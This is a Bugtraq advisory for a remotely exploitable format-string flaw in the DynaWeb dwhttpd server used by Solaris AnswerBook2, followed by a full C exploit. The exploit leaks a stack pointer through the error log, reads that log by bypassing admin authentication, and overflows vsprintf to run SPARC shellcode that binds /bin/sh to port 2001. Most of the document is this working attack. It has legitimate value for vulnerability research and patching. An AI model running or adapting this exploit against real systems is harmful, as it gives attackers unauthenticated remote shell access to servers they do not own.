source: http://www.securityfocus.com/bid/5384/info

Inso DynaWeb webserver, dwhttpd, is used as a subcomponent in products such as Sun's AnswerBook2, which is shipped as part of the Solaris operating environment. 

The dwhttpd webserver is prone to a remotely exploitable format-string vulnerability that occurs when logging requests for files that do not exist. Exploits may allow attacker-supplied code supplied to run with the privileges of the dwhttpd. 

Note that a vulnerability described in Bugtraq ID 5583 allows for unauthenticated remote attackers to view the logfile. Attackers may exploit that vulnerability to more easily exploit this issue successfully and automatically.

/*
 * Solaris/SPARC AnswerBook2 / DynaWeb HTTPD remote exploit
 *
 * Exploits a format string vulnerability in dwhttpd to overflow the
 * destination string passed to vsprintf(3S) in nsapi_log_error().
 * The constructed format string uses a large field width, which when
 * interpreted by vsprintf(), overflows the destination string and
 * places code on the stack.  Using a carefully crafted request and
 * the format string bug, it bypasses authentication to retrieve a
 * pointer to the stack out of the dwhttpd error log.  Using this
 * pointer, we calculate the exact location of our shellcode.
 * The shellcode included binds /bin/sh to port 2001.
 *
 * I found this bug on 2000-09-22, but kept poking at exploit over
 * next year or so.
 * 
 * -ghandi <ghandi@mindless.com>, 2001-07-08
 */

/* XXX: Doesn't work from an intel (little-endian) machine. */

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <stdlib.h>
#include <netdb.h>

char bindsh_sparc[] =
  "\xa0\x23\xa0\x10"	/* sub    	%sp, 16, %l0                 */
  "\xae\x23\x80\x10"	/* sub    	%sp, %l0, %l7                */
  "\xee\x23\xbf\xec"	/* st     	%l7, [%sp - 20]              */
  "\x90\x25\xe0\x0e"	/* sub    	%l7, 14, %o0                 */
  "\x92\x25\xe0\x0e"	/* sub    	%l7, 14, %o1                 */
  "\x94\x1c\x40\x11"	/* xor    	%l1, %l1, %o2                */
  "\x96\x1c\x40\x11"	/* xor    	%l1, %l1, %o3                */
  "\x98\x25\xe0\x0f"	/* sub    	%l7, 15, %o4                 */
  "\x82\x05\xe0\xd6"	/* add    	%l7, 214, %g1                */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\xa4\x1a\x80\x08"	/* xor    	%o2, %o0, %l2                */
  "\xd2\x33\xbf\xf0"	/* sth    	%o1, [%sp - 16]              */
  "\xac\x10\x27\xd1"	/* mov    	2001, %l6                    */
  "\xec\x33\xbf\xf2"	/* sth    	%l6, [%sp - 14]              */
  "\xc0\x23\xbf\xf4"	/* st     	%g0, [%sp - 12]              */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0                */
  "\x92\x1a\xc0\x10"	/* xor    	%o3, %l0, %o1                */
  "\x94\x1a\xc0\x17"	/* xor    	%o3, %l7, %o2                */
  "\x82\x05\xe0\xd8"	/* add    	%l7, 216, %g1                */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0                */
  "\x92\x25\xe0\x0b"	/* sub    	%l7, 11, %o1                 */
  "\x82\x05\xe0\xd9"	/* add    	%l7, 217, %g1                */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1a\xc0\x12"	/* xor    	%o3, %l2, %o0                */
  "\x92\x1a\xc0\x10"	/* xor    	%o3, %l0, %o1                */
  "\x94\x23\xa0\x14"	/* sub    	%sp, 20, %o2                 */
  "\x82\x05\xe0\xda"	/* add    	%l7, 218, %g1                */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\xa6\x1a\xc0\x08"	/* xor    	%o3, %o0, %l3                */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0                */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1                  */
  "\x94\x1b\x80\x0e"	/* xor    	%sp, %sp, %o2                */
  "\x82\x05\xe0\x2e"	/* add    	%l7, 46, %g1                 */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0                */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1                  */
  "\x94\x02\xe0\x01"	/* add    	%o3, 1, %o2                  */
  "\x82\x05\xe0\x2e"	/* add    	%l7, 46, %g1                 */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1a\xc0\x13"	/* xor    	%o3, %l3, %o0                */
  "\x92\x25\xe0\x07"	/* sub    	%l7, 7, %o1                  */
  "\x94\x02\xe0\x02"	/* add    	%o3, 2, %o2                  */
  "\x82\x05\xe0\x2e"	/* add    	%l7, 46, %g1                 */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0                */
  "\x82\x02\xe0\x17"	/* add    	%o3, 23, %g1                 */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x21\x0b\xd8\x9a"	/* sethi  	%hi(0x2f626800), %l0         */
  "\xa0\x14\x21\x6e"	/* or     	%l0, 0x16e, %l0	! 0x2f62696e */
  "\x23\x0b\xdc\xda"	/* sethi  	%hi(0x2f736800), %l1         */
  "\x90\x23\xa0\x10"	/* sub    	%sp, 16, %o0                 */
  "\x92\x23\xa0\x08"	/* sub    	%sp, 8, %o1                  */
  "\x94\x1b\x80\x0e"	/* xor    	%sp, %sp, %o2                */
  "\xe0\x3b\xbf\xf0"	/* std    	%l0, [%sp - 16]              */
  "\xd0\x23\xbf\xf8"	/* st     	%o0, [%sp - 8]               */
  "\xc0\x23\xbf\xfc"	/* st     	%g0, [%sp - 4]               */
  "\x82\x02\xe0\x3b"	/* add    	%o3, 59, %g1                 */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
  "\x90\x1b\x80\x0e"	/* xor    	%sp, %sp, %o0                */
  "\x82\x02\xe0\x01"	/* add    	%o3, 1, %g1                  */
  "\x91\xd0\x38\x08"	/* ta     	0x8                          */
;

typedef struct {
    char* version;       /* dwhttpd version string */
    int   ptr_offset;    /* Distance between stack pointer and '/' */
    int   align;         /* Double-word alignment padding, if any */
} dwhttpd_t;

typedef struct {
    char*         host;       /* Target host */
    int           port;       /* dwhttpd port (usually 8888) */
    unsigned long saved_fp;   /* Saved frame pointer */
    unsigned long saved_pc;   /* Saved program counter */
    char*         code;       /* Port binding code */
    char*         recon;      /* Reconaissance request string */
    dwhttpd_t*    dwhttpd;    /* version specific exploit parameters */
} target_t;    

/*
 * Default target version parameters
 */
dwhttpd_t dwhttpds[] = {
    { "dwhttpd/4.0.2a7a", 4779, 0 }, /* 1.2, Solaris_7 */
    { "dwhttpd/4.1a6",    4779, 0 }, /* 1.4, 1.4.1, 1.4.2 */
    { NULL, 0, 0 }
};

char* dwhttpd_hstrerror(int);
int   dwhttpd_get(target_t*, char*);
int   dwhttpd_recon(target_t*);
int   dwhttpd_get_ptr(target_t*);
int   dwhttpd_check_address(target_t*);
char* dwhttpd_munge(unsigned long);
int   dwhttpd_exploit(target_t*);

int main(int argc, char* argv[])
{
    char c;
    int recon = 1, exploit = 1;
    target_t target = { 0, 8888, 0, 0, bindsh_sparc, 0, &dwhttpds[1]};
    
    while ((c = getopt(argc, argv, "tr:d:")) != EOF) {
	switch (c) {
	case 'd':
	    target.dwhttpd = &dwhttpds[atoi(optarg)];
	    break;
	case 't':
	    exploit = 0;
	    break;
	case 'r':
	    recon = 0;
	    target.saved_pc = strtoul(optarg, NULL, 0);
	    target.saved_fp = target.saved_pc - 32;
	    break;
	default:
	    fprintf(stderr, "unknown flag, read the usage this 
time.\n");
	    return -1;
	}
    }

    if (!argv[optind]) {
	fprintf(stderr, "usage: %s [[-t] | [-r return address]] 
<hostname>\n"
		        " -t\tonly calculate return address\n"
		        " -r ret\tUse this return address\n",
		argv[0]);
	return -1;
    }
    
    target.host = strdup(argv[optind]);
   
    setvbuf(stdout, NULL, _IONBF, 0);
    
    if (recon) {
	/*
	 * Send the reconnaissance request to get a pointer to the stack
	 */
	printf("==> Sending reconnaissance request...\t\t\t");
	if (dwhttpd_recon(&target)) {
	    char* msg;
	    if (errno)
		msg = strerror(errno);
	    else
		msg = dwhttpd_hstrerror(h_errno);
	    
	    fprintf(stderr, "\nError sending reconnaissance request: 
%s\n",
		    msg);
	    return -1;
	}
	printf("%s\n", target.dwhttpd->version);
	
	/*
	 * Retrieve the stack pointer from the error log and calculate 
our
	 * return address.
	 */
	printf("==> Calculating return address from error log...\t");
	if (dwhttpd_get_ptr(&target)) {
	    fprintf(stderr, "\nError retrieving error log.\n");
	    return -1;
	}
	printf("0x%x\n", (unsigned int)target.saved_pc);
    }

    if (exploit) {
	/*
	 * Use the format string to overflow the buffer and jump into 
our
	 * shellcode.  Use %i7 - 24 as our %fp to give our shellcode
	 * some scratch space on the stack.
	 */
	printf("==> Attempting to exploit...\t\t\t\t");
	dwhttpd_exploit(&target);
	printf("done.\n");
	
	/*
	 * Hope it works.
	 */
	printf("==> Telnet to port 2001.\n");
    }
    
    return 0;
}

/*
 * Send a request that exploits the format string bug to print out a
 * pointer to the stack to the dwhttpd error log delimited by
 * asterisks for easy parsing.  While we're there, retrieve the
 * dwhttpd version.  Return 0 if the dwhttpd version was recognized,
 * -1 otherwise.
 */
int dwhttpd_recon(target_t* target)
{
    int fd, i;
    FILE* f;
    char line[4096];
    char* dwhttpd_version = NULL;

    sprintf(line, "/");
    for (i = 0; i < 219; i++)
	strcat(line, "%p");
    strcat(line, "*%p*");

    if ((fd = dwhttpd_get(target, line)) < 0) {
	return -1;
    }
    f = fdopen(fd, "r");
    while ((fgets(line, 4096, f)) != NULL) {
	if ((strncmp(line, "Server: ", 8)) == 0) {
	    if (strtok(line, " \r\n\t")) {
		char* server = strtok(NULL, " \r\n\t");
		if (server)
		    dwhttpd_version = strdup(server);
	    }
	}
    }
    fclose(f);

    for (i = 0; dwhttpds[i].version ; i++) {
	if (!strcmp(dwhttpd_version, dwhttpds[i].version)) {
	    target->dwhttpd = &dwhttpds[i];
	    return 0;
	}
    }
    
    errno = ENOENT;
    return -1;
}

/*
 * Bypass Ab2Admin to retrieve the error log and search for our stack
 * pointer (from dwhttpd_recon).  Our code will be at a version
 * dependent offset above that pointer, use that as our return address
 * value.
 */
int dwhttpd_get_ptr(target_t* target)
{
    int fd;
    FILE* f;
    char line[4096];
    char* ptr = NULL;
    char* request =
	"/ab2/@AdminViewError";

    if ((fd = dwhttpd_get(target, request)) < 0) {
	fprintf(stderr, "http error: %s\n", strerror(errno));
	return -1;
    }
    f = fdopen(fd, "r");
    while ((fgets(line, 4096, f)) != NULL) {
	char* str = NULL;
	if (strtok(line, "*")) {
	    str = strtok(NULL, "*");
	    if (str) {
		if (ptr) free(ptr);
		ptr = strdup(str);
	    }
	}
    }
    fclose(f);

    /*
     * Add a different offset to our pointer, depending on the version
     * of dwhttpd.  Use this as our target's saved program counter and
     * to calculate the saved frame pointer.
     */
    if (ptr) {
	unsigned int ulptr;
	if ((ulptr = strtoul(ptr, NULL, 16)) == 0) {
	    return -1;
	}
	target->saved_pc = ulptr + target->dwhttpd->ptr_offset;
	target->saved_fp = target->saved_pc - 32;
	return 0;
    }
    else {
	errno = ENOENT;
	return -1;
    }
}

/*
 * Check for double-word alignment and any character bytes in the
 * address that will make the exploit not work.  If there are any 
 * spaces or '?' characters in it, it will be parsed and truncated
 * before the format string bug.
 */
int dwhttpd_check_address(target_t* target)
{
    int i, j;
    char buf[4];
    unsigned long addrs[2];
    
    addrs[0] = target->saved_fp;
    addrs[1] = target->saved_pc;

    for (i = 0; i < 2; i++) {
	/* Check double-word alignment */
	if (((addrs[i] >> 3) << 3) != addrs[i])
	    return 1 + i;

	/* Check for parsed bytes */
	memcpy(buf, &addrs[i], 4);
	for (j = 0; j < 4; j++) {
	    if (buf[j] == '\0' || /* 0x00 */
		buf[j] == ' '  || /* 0x20 */
		buf[j] == '?')    /* 0x3f */
		return 3 + i;
	}
    }
    return 0;
}

/* Munge an address to placement in format string.  If the string has
 * a 0x20 byte in it, it will be replaced by a format trick to print
 * a space.  If there are any 0x3e ('?') or 0x00 ('\0') bytes, we
 * bail.
 */
char* dwhttpd_munge(unsigned long address)
{
    int i;
    char* str = malloc(29);

    for (i = 0; i < 4; i++) {
        char c[2];
        c[0] = ((char*)&address)[i];
        c[1] = '\0';
        
        if (c[0] == ' ')
            /* Print zero characters from the second string argument,
             * space padded to one character. (=> ' ' if arg != NULL)
             */
            strcat(str, "%2$1.0s");
        else if (c[0] == '?') {
            free(str);
            return NULL;
        }
        else if (c[0] == '\0') {
            free(str);
            return NULL;
        }
        else
            strcat(str, c);
    }

    return str;
}

/*
 * Send the exploit request using the calculated stack pointer (%fp
 * before the 'restore') and return address.  Because we can can
 * calculate the exact address from the recon request, we don't need
 * many NOPs, so we can have up to 4000 bytes of shellcode.
 */
int dwhttpd_exploit(target_t* target)
{
    int i, n, fd;
    char request[4065];
    char filler[65] = "\0";
    unsigned long saved_fp, saved_pc;
    char *saved_fp_str, *saved_pc_str;

    /* A small NOP filler */
    for (i = 0; i < 8; i++)
        strcat(filler, "\x21\x0b\xd8\x9a");
    
    /* Add space for "/%.4076[4 <= n <=28 chars][4 <= n <=28 chars]" */
    target->saved_fp += 32;
    target->saved_pc += 32;
    
    /* Check and ensure double-word alignment */
    if (((target->saved_fp >> 3) << 3) != target->saved_fp)
        saved_fp = ((target->saved_fp >> 3) << 3);

    if (((target->saved_pc >> 3) << 3) != target->saved_pc)
        saved_pc = ((target->saved_pc >> 3) << 3);

    /* Munge addresses for passing through parsing code */
    if ((saved_fp_str = dwhttpd_munge(saved_fp)) == NULL) {
        fprintf(stderr, "Couldn't munge %%fp = 0x%lx\n", saved_fp);
        return 0;
    }
    if ((saved_pc_str = dwhttpd_munge(saved_pc)) == NULL) {
        fprintf(stderr, "Couldn't munge %%i7 = 0x%lx\n", saved_pc);
        return 0;
    }

    /* Lock */
    snprintf(request, 4065, "/%%.4072x%.28s%.28s%.64s%.4000s",
	     saved_fp_str, saved_pc_str, filler, target->code);

    /* And Load */
    if ((fd = dwhttpd_get(target, request)) < 0) {
	fprintf(stderr, "http error: %s\n", strerror(errno));
	return 0;
    }
    close(fd);
    return n;
}    

/*
 * Connect to the specified server and perform a GET request for the
 * specified file.  Returns the connected socket file descriptor or -1
 * if an error occured.
 */
int dwhttpd_get(target_t* target, char* file) {
    int sock, l, n = 4080;
    struct sockaddr_in sa;
    struct hostent* he;
    size_t salen = sizeof(struct sockaddr);
    char buf[4080];
    

    if ((he = gethostbyname(target->host)) == NULL) {
	return -1;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);

    bzero(&sa, sizeof(struct sockaddr));

    sa.sin_family = AF_INET;
    memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);
    sa.sin_port = htons(target->port);

    if (connect(sock, (struct sockaddr*)&sa, salen) < 0) {
        return -1;
    }

    if ((l = snprintf(buf, n, "GET %s HTTP/1.0\r\n\r\n", file)) > n) {
	fprintf(stderr, "http_get: Request too long\n");
	errno = E2BIG;
	return -1;
    }

    if ((n = send(sock, buf, l, 0)) < 0) {
	perror("send");
	return -1;
    }
    
    return sock;
}    

char* dwhttpd_hstrerror(int err) {
    char* msg;
    
    switch (h_errno) {
    case HOST_NOT_FOUND:
	msg = "Host not found";
	break;
    case NO_DATA:
	msg = "No data";
	break;
    case NO_RECOVERY:
	msg = "No recovery";
	break;
    case TRY_AGAIN:
	msg = "Try again";
	break;
    }
    
    return msg;
}